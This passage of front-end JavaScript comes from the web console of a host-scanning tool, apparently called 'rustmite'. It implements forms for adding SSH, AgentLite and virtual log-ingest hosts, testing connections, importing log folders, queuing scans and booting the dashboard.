          <p id="addHostAgentHint" class="muted" style="margin:0.45rem 0 0;font-size:0.78rem">
            Ephemeral probe delivered over SSH (memfd/tmpfs). Highest fidelity.
          </p>
        </fieldset>
        <div id="addHostSshFields">
        <label>Input
          <select name="add_type" id="addHostType">
            <option value="list">Hostname / IP list</option>
            <option value="cidr">IP netblock list (CIDR)</option>
          </select>
        </label>
        <label id="addHostListLabel">Hosts (one hostname or IP per line)
          <textarea name="hosts" placeholder="vm&#10;web-01.internal&#10;10.0.0.12" rows="6"></textarea>
        </label>
        <div class="form-row">
          <label>SSH port
            <input name="ssh_port" type="number" value="22" min="1" max="65535" />
          </label>
          <label>SSH username
            <input name="ssh_user" placeholder="root / ubuntu" />
          </label>
          <label>Credential ref (optional)
            <input name="credential" placeholder="vault://ssh/default" />
          </label>
        </div>
        ${sshAuthFieldsHtml({
          method: "publickey",
          identityName: "identity",
          identityFileId: "addHostIdentityFile",
          idPrefix: "addSshAuth",
          sudoEnabled: false,
          sudoMode: "ssh_password",
        })}
        </div>
        <div id="addHostVirtualFields" class="hidden">
          <label>Virtual agent profile
            <select name="virtual_agent_id" id="addHostVirtualAgentId">
              ${virtualAgentOptionsHtml(state._vaProfileId || state.virtualAgents?.[0]?.id || "")}
            </select>
          </label>
          <p class="muted" style="margin:0 0 0.75rem;font-size:0.82rem">
            Upload a day folder to <strong>create or update</strong> one virtual host per subdirectory
            (matched by display name). Each import <strong>adds a new scan</strong> under Scans — previous imports stay in history.
          </p>
          <label>Kind
            <select name="kind">
              <option value="auto">Auto (sniff)</option>
              <option value="processes">Processes</option>
              <option value="files">Files</option>
            </select>
          </label>
          <label>Server path (file or directory on the server)
            <input name="path" class="mono" placeholder="/var/log/fleet or ./samples/procs.jsonl" autocomplete="off" />
          </label>
          <label class="rules-enable" style="display:flex;gap:0.5rem;align-items:center;margin:0.35rem 0">
            <input type="checkbox" name="recursive" checked />
            Recurse directories (*.jsonl)
          </label>
          <label>Upload .jsonl / .json / .csv files
            <input type="file" id="addHostVirtualFiles" multiple accept=".jsonl,.ndjson,.json,.csv,text/*" />
          </label>
          <label>Or upload a folder (day folder → create/update hosts by subdirectory)
            <input type="file" id="addHostVirtualDir" webkitdirectory directory multiple />
          </label>
          <p id="addHostVirtualPickStatus" class="muted" style="font-size:0.78rem;margin:0.4rem 0 0;min-height:1.2em"></p>
          ${treeHostFromFieldsHtml("addVirt")}
          <div id="addVirtDisplayNameWrap" class="hidden">
            <label>Display name
              <input name="virtual_name" placeholder="siem-feed-prod" autocomplete="off" />
            </label>
            <p class="muted" style="font-size:0.75rem;margin:0.25rem 0 0">Only needed for a single host (tree import off, or flat file upload). Same name updates an existing virtual host and adds a new scan.</p>
          </div>
          <div id="addHostVirtualProgress" class="hidden"></div>
          <div id="addHostVirtualResult" class="hidden" style="margin-top:0.75rem"></div>
        </div>
        <div class="form-row">
          <label>Env
            <input name="env" placeholder="prod" />
          </label>
          <label>Profile
            <input name="profile" placeholder="web" />
          </label>
          <label>Region
            <input name="region" placeholder="eu-west" />
          </label>
        </div>
        <label>Tags (optional, comma-separated)
          <input name="tags" placeholder="linux, pci" />
        </label>
        ${autoCollectFieldsHtml({ labels: { scan_interval: "manual" }, idPrefix: "addHostAuto", showCheckbox: true })}
        <div id="addHostCollectPaths" class="hidden" style="margin-top:0.65rem">
          <label>Extra file paths to inventory (AgentLite)
            <textarea name="collect_paths" rows="3" class="mono" placeholder="/opt/app&#10;/var/www&#10;/home/deploy/.ssh"></textarea>
          </label>
          <p class="muted" style="margin:0.25rem 0 0;font-size:0.75rem">
            Absolute files or directories (one per line, or comma-separated). Always merged with defaults (/bin, /usr/bin, /etc, /tmp, …).
          </p>
        </div>
        <div id="addHostTestResult"></div>
        <div class="form-actions" style="justify-content:space-between;flex-wrap:wrap">
          <button type="button" class="btn ghost" id="btnTestHostConn">Test connection</button>
          <div style="display:flex;gap:0.5rem">
            <button type="button" class="btn ghost" data-close-modal>Cancel</button>
            <button class="btn primary" type="submit">Finish</button>
          </div>
        </div>
      </form>
    `);
    const typeSel = $("#addHostType");
    const listLabel = $("#addHostListLabel");
    const sshFields = $("#addHostSshFields");
    const virtFields = $("#addHostVirtualFields");
    const agentHint = $("#addHostAgentHint");
    const collectPathsBox = $("#addHostCollectPaths");
    const testBtn = $("#btnTestHostConn");
    const form = $("#addHostForm");
    const agentHints = {
      ssh: "Ephemeral probe delivered over SSH (memfd/tmpfs). Highest fidelity.",
      agentlite: "SSH shell commands only — nothing is copied onto the host. Lower coverage; scans raise RM-POL-0021. Enable sudo when the SSH user is not root. Optionally add extra file paths at the bottom.",
      virtual: "Log ingest only — no SSH. Create a host, then push JSONL/CSV or import a day folder.",
    };
    const selectedAgent = () => {
      const checked = form?.querySelector('input[name="agent_kind"]:checked');
      return String(checked?.value || "ssh");
    };
    wireVirtualUploadPickers("#addHostVirtualFiles", "#addHostVirtualDir", "#addHostVirtualPickStatus", {
      idPrefix: "addVirt",
    });
    wireTreeHostFromFields("addVirt", "#addVirtDisplayNameWrap");
    const syncAddType = () => {
      const agent = selectedAgent();
      const isVirt = agent === "virtual";
      const inputType = typeSel?.value || "list";
      if (sshFields) sshFields.classList.toggle("hidden", isVirt);
      if (virtFields) virtFields.classList.toggle("hidden", !isVirt);
      if (collectPathsBox) collectPathsBox.classList.toggle("hidden", agent !== "agentlite");
      if (agentHint) agentHint.textContent = agentHints[agent] || agentHints.ssh;
      if (testBtn) {
        testBtn.classList.toggle("hidden", isVirt);
        testBtn.disabled = isVirt;
      }
      if (listLabel && !isVirt) {
        listLabel.firstChild.textContent = inputType === "cidr"
          ? "IP netblocks (CIDR, one per line)"
          : "Hosts (one hostname or IP per line)";
      }
    };
    form?.querySelectorAll("[data-add-agent]").forEach((el) => {
      el.addEventListener("change", syncAddType);
    });
    if (typeSel) typeSel.addEventListener("change", syncAddType);
    syncAddType();
    const resultEl = $("#addHostTestResult");
    let lastTest = null;
    wireIdentityPicker("identity", "addHostIdentityFile");
    wireSshAuthMethodToggle(form);
    wireSshSudoToggle(form);
    wireAutoCollectToggle("addHostAuto");

    $("#btnTestHostConn").addEventListener("click", async () => {
      if (selectedAgent() === "virtual") {
        toast("Virtual agents do not use SSH — Finish to create, then push logs");
        return;
      }
      const fd = new FormData(form);
      const { hosts: lines, errors } = expandHostLines(fd.get("hosts"));
      if (errors.length) {
        toast(errors[0]);
        return;
      }
      if (!lines.length) {
        toast("Enter at least one host to test");
        return;
      }
      if (lines.length > 1) {
        toast(`Testing first host only (${lines[0]})`);
      }
      const auth = readSshAuthFromForm(fd);
      if (auth.method === "password" && !auth.password && !auth.passwordFile) {
        toast("Enter an SSH password (or switch to public key)");
        return;
      }
      if (auth.method === "publickey" && !auth.identity) {
        toast("Choose an identity key (or switch to password)");
        return;
      }
      try {
        lastTest = await runHostConnectionTest({
          host: lines[0],
          ssh_port: Number(fd.get("ssh_port") || 22),
          username: String(fd.get("ssh_user") || "").trim() || null,
          auth_method: auth.method,
          identity: auth.method === "publickey" ? (auth.identity || null) : null,
          password: auth.method === "password" ? (auth.password || null) : null,
          password_file: auth.method === "password" && !auth.password
            ? (auth.passwordFile || null)
            : null,
          require_auth: true,
          connect_timeout_secs: 8,
        }, resultEl);
        if (!lastTest.ok) toast(`Test failed: ${lastTest.auth_status}`);
        else toast("Test passed");
      } catch (err) {
        lastTest = null;
        if (resultEl) resultEl.innerHTML = `<div class="conn-test bad"><div>${esc(err.message)}</div></div>`;
        toast(err.message);
      }
    });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      if (String(fd.get("agent_kind") || "ssh") === "virtual") {
        const labels = {};
        ["env", "profile", "region", "tags"].forEach((k) => {
          const v = String(fd.get(k) || "").trim();
          if (v) labels[k] = v;
        });
        const submitBtn = form.querySelector('button[type="submit"]');
        if (submitBtn) submitBtn.disabled = true;
        const progWrap = $("#addHostVirtualProgress");
        if (progWrap) {
          progWrap.classList.remove("hidden");
          progWrap.innerHTML = importProgressHtml("addHostVirtualProgBar");
          progWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
        }
        const ticker = startImportProgressTicker("addHostVirtualProgBar");
        try {
          setImportProgress("addHostVirtualProgBar", {
            title: "Preparing import",
            detail: "Scanning selected files…",
            pct: 0,
          });
          const feed = await readVirtualFeedFields(
            fd,
            "#addHostVirtualFiles",
            "#addHostVirtualDir",
            (p) => setImportProgress("addHostVirtualProgBar", {
              title: p.phase === "scan" || p.phase === "scan_done" ? "Scanning folder" : "Reading files",
              detail: p.detail,
              pct: p.pct,
            })
          );
          const wantTree = fd.get("tree_import") != null
            && isVirtualTreeFolderUpload(feed.files || []);
          if (fd.get("tree_import") != null && (feed.files || []).length && !wantTree) {
            $("#addVirtDisplayNameWrap")?.classList.remove("hidden");
            const name = String(fd.get("virtual_name") || "").trim();
            if (!name) {
              toast("Folder has no host subdirectories — enter a display name for a single host, or pick a day folder");
              ticker.stop();
              return;
            }
          }
          if (wantTree) {
            const treeOpts = readTreeHostFromForm(fd, "addVirt");
            setImportProgress("addHostVirtualProgBar", {
              title: "Importing host tree",
              detail: "Create or update one virtual host per subdirectory…",
              pct: 0,
            });
            const res = await importVirtualTreeUpload(
              feed.files,
              {
                host_from: treeOpts.host_from,
                parent_dir_field: treeOpts.parent_dir_field,
                delimiter: treeOpts.delimiter,
                create_scan: treeOpts.create_scan,
                replace: treeOpts.replace,
                kind: feed.kind || "auto",
                virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
              },
              (p) => setImportProgress("addHostVirtualProgBar", {
                title: "Importing host tree",
                detail: p.detail,
                pct: p.pct,
              })
            );
            ticker.stop();
            const s = res.summary || {};
            const updated = (s.results || []).filter((r) => !r.error && r.created === false).length;
            const created = (s.results || []).filter((r) => !r.error && r.created === true).length;
            setImportProgress("addHostVirtualProgBar", {
              title: "Done",
              detail: `${s.hosts_ok ?? 0} hosts ok (${created} new · ${updated} updated) · ${s.hosts_failed ?? 0} failed`,
              done: true,
            });
            const box = $("#addHostVirtualResult");
            if (box) {
              const rows = (s.results || []).slice(0, 30).map((r) => `
                <tr>
                  <td class="mono">${esc(r.display_name || r.dir || "")}</td>
                  <td>${r.error ? "—" : (r.created ? "new" : "updated")}</td>
                  <td class="mono">${r.error ? esc(r.error) : `${r.processes ?? 0}p / ${r.files ?? 0}f`}</td>
                </tr>`).join("");
              box.classList.remove("hidden");
              box.innerHTML = `
                <div class="panel" style="padding:0.65rem">
                  <div><strong>${esc(String(created))}</strong> created ·
                    <strong>${esc(String(updated))}</strong> updated ·
                    <strong>${esc(String(s.hosts_failed ?? 0))}</strong> failed</div>
                  <div class="data-table-wrap" style="margin-top:0.45rem;max-height:180px;overflow:auto">
                    <table class="data"><thead><tr><th>Host</th><th></th><th>Rows</th></tr></thead><tbody>${rows}</tbody></table>
                  </div>
                </div>`;
            }
            await loadAll();
            state._hostPreset = "";
            state._hostQ = "";
            toast(`Tree upload: ${created} new · ${updated} updated`);
            // Keep modal open briefly so the create/update table is visible.
            setTimeout(() => {
              closeModal();
              location.hash = "#/hosts";
              render();
            }, 1600);
            return;
          }
          const name = String(fd.get("virtual_name") || "").trim();
          if (!name) {
            toast("Display name required (or upload a day folder with subdirectories)");
            ticker.stop();
            return;
          }
          const existed = existingVirtualHostNames().has(name);
          const treeOpts = readTreeHostFromForm(fd, "addVirt");
          setImportProgress("addHostVirtualProgBar", {
            title: existed ? "Updating host" : "Creating host",
            detail: feed.files.length
              ? `Uploading ${feed.fileCount} file(s) · ${formatUploadBytes(feed.readBytes)}…`
              : (existed ? "Refreshing virtual agent…" : "Registering virtual agent…"),
            pct: null,
          });
          const res = await createVirtualHostChunked({
            display_name: name,
            labels,
            path: feed.path || null,
            recursive: feed.recursive,
            kind: feed.kind || "auto",
            files: feed.files || [],
            create_scan: treeOpts.create_scan,
            replace: treeOpts.replace,
            virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
          }, (p) => setImportProgress("addHostVirtualProgBar", {
            title: p.phase === "pack" ? "Packaging upload" : "Uploading to server",
            detail: p.detail,
            pct: p.pct,
          }));
          ticker.stop();
          const tok = res.host?.ingest_token || res.ingest?.ingest_token || "";
          let importMsg = "";
          if (res.import_error) {
            importMsg = ` · import failed: ${res.import_error}`;
            setImportProgress("addHostVirtualProgBar", {
              title: "Host created — import failed",
              detail: String(res.import_error),
              done: true,
            });
          } else if (res.import) {
            importMsg = ` · imported ${res.import.files_processed ?? 0} file(s)`;
            setImportProgress("addHostVirtualProgBar", {
              title: "Done",
              detail: `Imported ${res.import.files_processed ?? 0} file(s)`,
              done: true,
            });
          } else {
            setImportProgress("addHostVirtualProgBar", {
              title: "Done",
              detail: "Virtual agent created",
              done: true,
            });
          }
          await loadAll();
          closeModal();
          const verb = res.created === false || existed ? "updated" : "created";
          toast(`Virtual agent ${verb}${importMsg}`);
          if (tok && verb === "created") {
            try {
              await navigator.clipboard.writeText(tok);
              toast("Ingest token copied");
            } catch (_) {}
          }
        } catch (err) {
          ticker.stop();
          setImportProgress("addHostVirtualProgBar", {
            title: "Failed",
            detail: err.message || String(err),
            done: true,
          });
          toast(err.message);
        } finally {
          if (submitBtn) submitBtn.disabled = false;
        }
        return;
      }
      const { hosts: lines, errors } = expandHostLines(fd.get("hosts"));
      if (errors.length) {
        toast(errors[0]);
        return;
      }
      if (!lines.length) {
        toast("Enter at least one host or netblock");
        return;
      }
      if (lines.length > 4096) {
        toast(`Expanded to ${lines.length} hosts — please use smaller netblocks (max 4096 per add)`);
        return;
      }
      const port = Number(fd.get("ssh_port") || 22);
      const sshUser = String(fd.get("ssh_user") || "").trim();
      const auth = readSshAuthFromForm(fd);
      const labels = {};
      ["env", "profile", "region", "credential", "tags"].forEach((k) => {
        const v = String(fd.get(k) || "").trim();
        if (v) labels[k] = v;
      });
      if (sshUser) labels.ssh_user = sshUser;
      applyAutoCollectFromForm(fd, labels, { checkboxMode: true });

      try {
        if (auth.method === "password") {
          labels.ssh_auth = "password";
          delete labels.ssh_identity;
          let pwFile = auth.passwordFile;
          if (auth.password) {
            pwFile = await storeSshPassword(auth.password, sshUser || lines[0] || "ssh-password");
            const hidden = form.querySelector('[name="ssh_password_file"]');
            if (hidden) hidden.value = pwFile;
            const pwInput = form.querySelector('[name="ssh_password"]');
            if (pwInput) pwInput.value = "";
          }
          if (pwFile) labels.ssh_password_file = pwFile;
          else delete labels.ssh_password_file;
        } else {
          labels.ssh_auth = "publickey";
          delete labels.ssh_password_file;
          if (auth.identity) labels.ssh_identity = auth.identity;
          else delete labels.ssh_identity;
        }
        await applySshSudoFromForm(fd, labels, sshUser || lines[0] || "host");
      } catch (err) {
        toast(err.message);
        return;
      }

      const agentKind = String(fd.get("agent_kind") || "ssh").trim().toLowerCase() === "agentlite"
        ? "agentlite"
        : "ssh";
      if (agentKind === "agentlite") {
        labels.scan_mode = "ssh_commands";
        const paths = String(fd.get("collect_paths") || "").trim();
        if (paths) labels.collect_paths = paths;
        else delete labels.collect_paths;
      } else {
        delete labels.scan_mode;
        delete labels.collect_paths;
      }

      const hasCred = !!(
        labels.credential
        || labels.ssh_identity
        || labels.ssh_password_file
        || (sshUser && (auth.identity || auth.password || auth.passwordFile))
      );
      if (!hasCred && !lastTest) {
        const proceed = window.confirm(
          "No SSH credentials and no successful Test connection.\n\nHosts will be marked Inactive (no_credential) and cannot be scanned until you add credentials and test.\n\nContinue anyway?"
        );
        if (!proceed) return;
      }
      if (lastTest && !lastTest.ok && lines.length === 1) {
        const proceed = window.confirm(
          `Last test failed (${lastTest.auth_status}). Add the host as Inactive anyway?`
        );
        if (!proceed) return;
      }

      let n = 0;
      const submitBtn = e.target.querySelector('button[type="submit"]');
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = `Adding 0/${lines.length}…`;
      }
      try {
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          const auth_status = (i === 0 && lastTest)
            ? lastTest.auth_status
            : (hasCred ? undefined : "no_credential");
          const auth_detail = (i === 0 && lastTest)
            ? (lastTest.stages || []).map((s) => `${s.name}: ${s.detail}`).join(" · ")
            : (hasCred
              ? undefined
              : "No SSH credential configured — use Test connection before scanning");
          await api("/v1/hosts", {
            method: "POST",
            body: {
              display_name: line,
              primary_addr: line,
              ssh_port: port,
              agent_kind: agentKind,
              labels,
              auth_status,
              auth_detail,
            },
          });
          n += 1;
          if (submitBtn && n % 25 === 0) submitBtn.textContent = `Adding ${n}/${lines.length}…`;
        }
        closeModal();
        toast(`Added ${n} ${agentKind === "agentlite" ? "AgentLite " : ""}host(s)${!hasCred ? " · marked inactive (no credential)" : ""}`);
        await loadAll();
        setView("hosts");
      } catch (err) {
        toast(`${err.message} (added ${n})`);
        await loadAll();
      }
    });
  }

  function showQuickScan(defaultSet = "standard") {
    if (!state.hosts.length) {
      toast("Add a host first");
      setView("hosts");
      return;
    }
    openModal(defaultSet === "incident" ? "Incident scan" : "Manual scan", `
      <form class="form" id="scanForm">
        <label>Host
          <select name="host_id">
            ${state.hosts.slice(0, 500).map((h) => `<option value="${esc(h.id)}">${esc(h.display_name)}</option>`).join("")}
          </select>
        </label>
        <p class="muted" style="margin:0 0 0.55rem;font-size:0.85rem">Scan type</p>
        <div class="check-set-grid" id="checkSetGrid">
          ${checkSetOptionsHtml(defaultSet)}
        </div>
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Start scan</button>
        </div>
      </form>
    `);
    const grid = $("#checkSetGrid");
    if (grid) {
      grid.addEventListener("change", () => {
        $$(".check-set-card", grid).forEach((card) => {
          const input = card.querySelector('input[type="radio"]');
          card.classList.toggle("active", !!(input && input.checked));
        });
      });
    }
    $("#scanForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      try {
        const job = await api(`/v1/hosts/${fd.get("host_id")}/scan`, {
          method: "POST",
          body: { check_set: fd.get("check_set") || defaultSet, priority: 150 },
        });
        closeModal();
        toast(`Scan queued ${shortId(job.id)} (${fd.get("check_set") || defaultSet})`);
        await loadAll();
        setView("queue");
      } catch (err) {
        toast(err.message);
      }
    });
  }

  function startPolling() {
    if (state.pollTimer) clearInterval(state.pollTimer);
    state.pollTimer = setInterval(() => {
      loadLive().catch(() => {});
      updateClock();
    }, 2000);
  }

  function boot() {
    const saved = localStorage.getItem("rustmite_api_token") || "";
    if ($("#apiToken")) $("#apiToken").value = saved;
    $("#apiToken")?.addEventListener("change", (e) => {
      saveToken(e.target.value.trim());
      loadAll().catch((err) => toast(err.message));
    });
    wireLoginForm();
    $("#btnLogout")?.addEventListener("click", async () => {
      try {
        await fetch("/v1/auth/logout", {
          method: "POST",
          headers: { Authorization: `Bearer ${sessionToken()}` },
        });
      } catch (_) {}
      setSessionToken(null);
      state.authUser = null;
      showLogin(true);
      updateSessionChrome();
      toast("Signed out");
    });
    setTheme(state.theme);
    const themeBtn = $("#themeBtn");
    const themeDropdown = $("#themeDropdown");
    if (themeBtn && themeDropdown) {
      themeBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        const open = themeDropdown.classList.toggle("open");
        themeBtn.setAttribute("aria-expanded", open);
        themeDropdown.setAttribute("aria-hidden", !open);
      });
      themeDropdown.addEventListener("click", (e) => e.stopPropagation());
      $$(".theme-option").forEach((opt) => {
        opt.addEventListener("click", () => {
          setTheme(opt.dataset.theme);
          themeDropdown.classList.remove("open");
          themeBtn.setAttribute("aria-expanded", "false");
          themeDropdown.setAttribute("aria-hidden", "true");
        });
      });
      document.addEventListener("click", () => {
        themeDropdown.classList.remove("open");
        themeBtn.setAttribute("aria-expanded", "false");
        themeDropdown.setAttribute("aria-hidden", "true");
      });
    }
    $$(".nav-group-toggle").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        const group = btn.closest(".nav-group");
        if (!group) return;
        const open = !group.classList.contains("open");
        // If collapsing while on an SSH page, jump back to hosts so the menu can stay closed.
        if (!open && String(state.view || "").startsWith("ssh-")) {
          setView("hosts");
          return;
        }
        setSshHunterOpen(open);
      });
    });
    // Ensure SSH Hunter starts collapsed on boot.
    setSshHunterOpen(false);
    $$(".nav-item[data-view]").forEach((b) => b.addEventListener("click", () => setView(b.dataset.view)));
    $("#btnRefresh").addEventListener("click", () => loadAll().catch((e) => toast(e.message)));
    $("#btnQuickScan").addEventListener("click", () => showQuickScan("standard"));
    $("#btnQueue").addEventListener("click", () => setView("queue"));
    const liveToggle = $("#liveToggle");
    if (liveToggle) {
      liveToggle.addEventListener("click", () => {
        const strip = $("#liveStrip");
        const collapsed = strip.classList.toggle("collapsed");
        liveToggle.setAttribute("aria-expanded", String(!collapsed));
        liveToggle.title = collapsed ? "Expand" : "Collapse";
      });
    }
    $("#clockBox").addEventListener("click", () => {
      state.useUtc = !state.useUtc;
      localStorage.setItem("rustmite_clock_utc", state.useUtc ? "1" : "0");
      updateClock();
      renderLiveStrip();
      if (state.view === "activity" || state.view === "dashboard") render();
    });
    const menu = $("#scanMenu");
    $("#btnScanMenu").addEventListener("click", (e) => {
      e.stopPropagation();
      menu.classList.toggle("hidden");
    });
    $$("#scanMenu [data-scan-mode]").forEach((b) => {
      b.addEventListener("click", () => {
        menu.classList.add("hidden");
        showQuickScan(b.dataset.scanMode);
      });
    });
    document.addEventListener("click", () => menu.classList.add("hidden"));
    $$("[data-close]").forEach((el) => el.addEventListener("click", closeDrawer));
    document.addEventListener("click", (e) => {
      if (e.target.matches("[data-close-modal]")) closeModal();
    });
    updateClock();
    window.addEventListener("hashchange", () => applyLocationHash());
    const bootHash = String(location.hash || "");
    if (bootHash.startsWith("#finding/") || bootHash.startsWith("#host/") || bootHash.startsWith("#/")) {
      // Defer view until data loads; apply hash after loadAll.
      if (bootHash.startsWith("#host/")) setView("hosts", { skipHash: true });
      else if (bootHash.startsWith("#finding/")) setView("findings", { skipHash: true });
      else {
        const viewMatch = bootHash.match(/^#\/([\w-]+)/);
        if (viewMatch) setView(viewMatch[1], { skipHash: true });
        else setView("dashboard", { skipHash: true });
      }
    } else {
      setView("dashboard");
    }
    ensureAuth().then((ok) => {
      if (!ok) {
        $("#healthPill").textContent = "sign in";
        $("#healthPill").className = "health warn";
        return;
      }
      startPolling();
      return loadAll().then(() => applyLocationHash());
    }).catch((err) => {
      $("#healthPill").textContent = "API error";
      $("#healthPill").className = "health bad";
      toast(err.message);
      render();
    });
  }

  boot();
})();
